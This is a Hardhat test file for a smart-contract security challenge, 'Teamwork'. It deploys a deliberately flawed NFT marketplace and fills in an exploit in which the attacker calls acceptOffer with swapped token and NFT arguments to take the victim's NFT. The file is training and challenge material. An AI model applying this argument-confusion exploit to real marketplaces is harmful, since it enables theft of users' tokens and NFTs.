const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Teamwork', function () {
    let deployer, attacker, victim;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker, victim] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const BrokenSeaFactory = await ethers.getContractFactory("BrokenSea_P", deployer);

        this.token = await DamnValuableToken.deploy();
        this.nft = await DamnValuableNFTFactory.deploy();
        this.brokenSea = await BrokenSeaFactory.deploy();

        await this.token.transfer(attacker.address, ethers.utils.parseEther('1'));

        await this.nft.safeMint(victim.address);
        await this.nft.safeMint(victim.address);
        await this.nft.safeMint(victim.address);
        await this.nft.safeMint(attacker.address);

        await this.nft.connect(victim).setApprovalForAll(this.brokenSea.address,true);
        await this.token.connect(victim).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));

        await this.nft.connect(attacker).setApprovalForAll(this.brokenSea.address,true);
        await this.token.connect(attacker).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));


        expect(
            await this.nft.ownerOf(0)
        ).to.equal(victim.address);

        expect(
            await this.nft.ownerOf(1)
        ).to.equal(victim.address);

        expect(
            await this.nft.ownerOf(2)
        ).to.equal(victim.address);

        expect(
            await this.nft.ownerOf(3)
        ).to.equal(attacker.address);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(ethers.utils.parseEther('1'));

    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        await this.brokenSea.connect(victim).createOffer(
            this.nft.address, 
            3, 
            this.token.address, 
            1
        );

        await this.brokenSea.connect(attacker).acceptOffer(
            victim.address,
            this.token.address,
            3,
            this.nft.address,
            1
        );

        expect(
            await this.nft.ownerOf(1)
        ).to.equal(attacker.address);

        // expect(
        //     await this.token.balanceOf(victim.address)
        // ).to.equal(ethers.utils.parseEther('3'));
    });

});